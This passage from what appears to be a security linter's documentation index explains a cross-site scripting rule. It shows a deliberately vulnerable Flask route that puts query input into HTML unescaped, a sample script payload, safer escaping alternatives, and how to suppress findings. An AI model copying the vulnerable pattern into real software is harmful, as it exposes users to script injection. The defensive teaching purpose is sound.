sites.</p> <p>Even in frameworks with built-in autoescaping (like Django or Flask with Jinja2), XSS can still occur if:</p> <ul> <li>Autoescaping is disabled (<code>autoescape=False</code> in Jinja2, or improper use of <code>mark_safe</code>/<code>|safe</code> filters) (CSP-D103, CSP-D703).</li> <li>User input is concatenated directly into HTML strings without encoding.</li> <li>Data passes through multiple functions before rendering, and sanitization is missed along the way.</li> </ul>"},{"location":"rule/CSP-X001/#vulnerable-code-example","title":"Vulnerable Code Example","text":"<pre><code>from flask import Flask, request, Response\nimport html # For escaping, but not used here correctly\n\napp = Flask(__name__)\n\n@app.route('/greet')\ndef greet_user():\n    name = request.args.get('name', 'Guest')\n\n    # User input 'name' is directly embedded into an HTML string without escaping.\n    # If name contains '&lt;script&gt;alert(1)&lt;/script&gt;', it will be executed.\n    html_output = f\"&lt;p&gt;Hello, {name}!&lt;/p&gt;\"\n\n    return Response(html_output, mimetype='text/html')\n</code></pre>"},{"location":"rule/CSP-X001/#safe-code-example","title":"Safe Code Example","text":"<p>The primary defense against XSS is to ensure that all data originating from untrusted sources is properly encoded or escaped before being rendered in an HTML context.</p>"},{"location":"rule/CSP-X001/#using-a-templating-engine-with-autoescaping-recommended","title":"Using a Templating Engine with Autoescaping (Recommended)","text":"<p>Frameworks like Flask (with Jinja2) or Django automatically escape variables by default.</p> <pre><code>from flask import Flask, request, render_template_string\nfrom jinja2 import Markup # Used to explicitly mark safe content if needed\n\napp = Flask(__name__)\n\n@app.route('/greet')\ndef greet_user():\n    name = request.args.get('name', 'Guest')\n\n    # Jinja2 will automatically escape the 'name' variable in the template.\n    template = \"&lt;h1&gt;Hello, {{ user_name }}!&lt;/h1&gt;\"\n    return render_template_string(template, user_name=name)\n\n# Example if you have a trusted HTML string:\ntrusted_html_snippet = \"&lt;b&gt;User&lt;/b&gt;\"\n# Use Markup to tell Jinja2 this specific string is already safe HTML.\n# This is generally not needed for simple variable output.\n# return render_template_string(\"&lt;div&gt;{{ trusted_content }}&lt;/div&gt;\", trusted_content=Markup(trusted_html_snippet))\n</code></pre>"},{"location":"rule/CSP-X001/#manual-escaping-less-recommended","title":"Manual Escaping (Less Recommended)","text":"<p>If you are not using a templating engine or need to build HTML strings manually, ensure you manually escape all user-provided input.</p> <pre><code>import html\n\nname = request.args.get('name', 'Guest')\n\n# Manually escape user input before embedding it in HTML.\nescaped_name = html.escape(name)\n\nhtml_output = f\"&lt;p&gt;Hello, {escaped_name}!&lt;/p&gt;\"\n</code></pre>"},{"location":"rule/CSP-X001/#defense-in-depth","title":"Defense in Depth","text":"<p>Consider implementing a Content Security Policy (CSP) header. CSP acts as an additional layer of defense by defining which content sources are trusted, helping to prevent XSS attacks even if an injection vulnerability exists.</p>"},{"location":"rule/CSP-X001/#how-to-suppress-a-finding","title":"How to Suppress a Finding","text":"<p>If you have robust, verified sanitization or encoding logic applied to the data before it reaches the rendering sink, you may suppress the finding.</p> <pre><code># The user_input has been sanitized by a trusted function before rendering.\n# ignore\nreturn f\"&lt;p&gt;Welcome, {sanitized_input}!&lt;/p&gt;\"\n</code></pre> <p>Or, for this specific rule:</p> <pre><code># ignore: CSP-X001\nreturn f\"&lt;p&gt;Welcome, {user_input}!&lt;/p&gt;\" # Assuming input is safely handled elsewhere\n</code></pre>"},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/category/announcements/","title":"Announcements","text":""}]}